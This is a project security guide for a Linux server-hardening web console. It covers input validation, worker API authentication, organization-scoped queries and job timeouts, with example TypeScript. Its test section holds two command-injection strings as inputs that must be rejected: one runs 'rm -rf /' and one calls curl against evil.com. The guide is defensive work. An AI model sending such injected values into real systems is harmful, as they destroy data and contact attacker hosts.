# API Security Implementation Guide

This document outlines the security measures implemented in the Linux Hardening Console and provides guidance for future backend API integration.

## Security Measures Implemented

### 1. Input Validation (Zod)

All user inputs for hostname and IP address fields are strictly validated using Zod schemas to prevent command injection attacks.

**Location**: `src/lib/validation.ts`

**Protected Fields**:
- **Hostname**: Must match valid hostname pattern, reject special characters `;&|` ` $()<>\'"{}[]`
- **IP Address**: Must be valid dotted-decimal IPv4 (0-255 per octet, no leading zeros, since `inet_aton` reads `010.0.0.1` as octal `8.0.0.1`), reject special characters
- **Tags**: Max 50 characters, allowlist of letters, digits, `.`, `_`, `:` and `-` (no whitespace or control characters)

**Frontend Validation**: Implemented in `src/components/ServerFormDialog.tsx`

**Backend Integration**:
```typescript
// Example backend endpoint validation
import { validateServerForm } from './validation'

app.post('/api/servers', async (req, res) => {
  const result = validateServerForm(req.body)
  
  if (!result.success) {
    return res.status(400).json({ 
      error: 'Validation failed',
      details: result.error.errors 
    })
  }
  
  // Proceed with validated data
  const { hostname, ipAddress, tags } = result.data
})
```

### 2. API Authentication (Worker Endpoints)

**Environment Variable**: `WORKER_API_SECRET`

All worker API endpoints MUST verify this secret before processing requests.

**Implementation Template**:
```typescript
// src/api/worker.ts (example for future implementation)
import { createHash, timingSafeEqual } from 'node:crypto'
import type { Request } from 'express'

const WORKER_API_SECRET = process.env.WORKER_API_SECRET ?? ''

// Fail closed at startup: an unset or short secret must never mean "no auth".
if (WORKER_API_SECRET.length < 32) {
  throw new Error('WORKER_API_SECRET must be set to a random value of at least 32 characters')
}

const sha256 = (value: string) => createHash('sha256').update(value).digest()
const expectedDigest = sha256(WORKER_API_SECRET)

function authenticateWorker(req: Request): boolean {
  const authHeader = req.get('authorization')

  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return false
  }

  const token = authHeader.slice('Bearer '.length)
  // Compare fixed-length digests in constant time so response timing
  // doesn't leak how much of the token matched.
  return timingSafeEqual(sha256(token), expectedDigest)
}

// Example endpoint
app.post('/api/worker/jobs/pickup', async (req, res) => {
  if (!authenticateWorker(req)) {
    return res.status(401).json({ error: 'Unauthorized' })
  }
  
  // Process worker request
})
```

**Required Endpoints**:
- `POST /api/worker/jobs/pickup` - Worker picks up pending jobs
- `POST /api/worker/jobs/:id/update` - Worker updates job status
- `POST /api/worker/jobs/:id/complete` - Worker marks job complete/failed

**Security Requirements**:
- Never hardcode the secret - always use `process.env.WORKER_API_SECRET`
- Refuse to start when the secret is missing or short, and compare tokens with `crypto.timingSafeEqual`, never `===`
- Use HTTPS only in production
- Rotate secrets regularly
- Log failed authentication attempts

### 3. Data Isolation (Organization Scoping)

All database queries MUST filter by the authenticated user's organization ID.

**Current Implementation**: 
- All `Server` and `Job` types include `organizationId` field
- Frontend filters all data by current user's organization (`src/App.tsx`)
- Uses `getCurrentOrganizationId()` from `src/lib/auth.ts`

**Backend Query Examples**:

```typescript
// BAD - No organization filtering
const servers = await db.server.findMany()

// GOOD - Scoped to user's organization
const servers = await db.server.findMany({
  where: { organizationId: user.organizationId }
})

// BAD - Direct access by ID
const server = await db.server.findUnique({
  where: { id: serverId }
})

// GOOD - Verify ownership before returning
const server = await db.server.findFirst({
  where: { 
    id: serverId,
    organizationId: user.organizationId 
  }
})
```

**Critical Rules**:
1. NEVER query servers/jobs without organization filter
2. ALWAYS verify organization ownership on UPDATE/DELETE operations
3. VALIDATE organization ID matches authenticated user
4. PREVENT cross-organization data access at all layers

### 4. Job Timeout Detection

Jobs running longer than 20 minutes are automatically marked as TIMED_OUT.

**Configuration**: `JOB_TIMEOUT_MS = 20 * 60 * 1000` (20 minutes)

**Implementation**: 
- `src/lib/auth.ts` - `getJobStatus()` function
- Checks if job has been in RUNNING state > 20 minutes
- Returns `TIMED_OUT` status for UI display
- Used in `JobStatusBadge`, `JobCard`, and `JobDetailsDialog`

**Backend Integration**:
```typescript
// Periodic cleanup job (run every 5 minutes)
async function cleanupTimedOutJobs() {
  const twentyMinutesAgo = Date.now() - (20 * 60 * 1000)
  
  await db.job.updateMany({
    where: {
      status: 'RUNNING',
      startedAt: { lt: twentyMinutesAgo }
    },
    data: {
      status: 'TIMED_OUT',
      error: 'Job exceeded maximum execution time of 20 minutes',
      completedAt: Date.now()
    }
  })
}
```

## Future Backend Integration Checklist

When implementing a real backend, ensure:

- [ ] Input validation using Zod schemas on all API endpoints
- [ ] Worker authentication using `process.env.WORKER_API_SECRET`
- [ ] Organization scoping on ALL database queries
- [ ] Timeout detection and cleanup job
- [ ] HTTPS only in production
- [ ] Rate limiting on API endpoints
- [ ] Audit logging for all security-critical operations
- [ ] SQL injection prevention (use parameterized queries)
- [ ] CORS configuration (restrict to your domain)
- [ ] CSP headers configured
- [ ] Secrets stored in environment variables, never committed

## Testing Security

**Input Validation Tests** (`npm test`, see `src/lib/validation.test.ts`):
```typescript
// Test malicious inputs are rejected
expect(hostnameSchema.safeParse('test; rm -rf /')).toHaveError()
expect(ipAddressSchema.safeParse('192.168.1.1; curl evil.com')).toHaveError()
```

**Organization Isolation Tests**:
```typescript
// Verify user A cannot access user B's servers
const userA = { organizationId: 'org-a' }
const userB = { organizationId: 'org-b' }

// userB tries to access userA's server
const result = await getServer(userAServerId, userB.organizationId)
expect(result).toBeNull()
```

**Worker Auth Tests**:
```typescript
// Verify invalid secrets are rejected
const response = await fetch('/api/worker/jobs/pickup', {
  headers: { 'Authorization': 'Bearer wrong-secret' }
})
expect(response.status).toBe(401)
```

## Security Incident Response

If a security vulnerability is discovered:

1. **Immediately rotate** `WORKER_API_SECRET` if compromised
2. **Audit logs** for unauthorized access attempts
3. **Notify users** if data breach occurred
4. **Patch vulnerability** and deploy ASAP
5. **Post-mortem** to prevent recurrence

## Contact

For security issues, contact: [your-security-email@example.com]
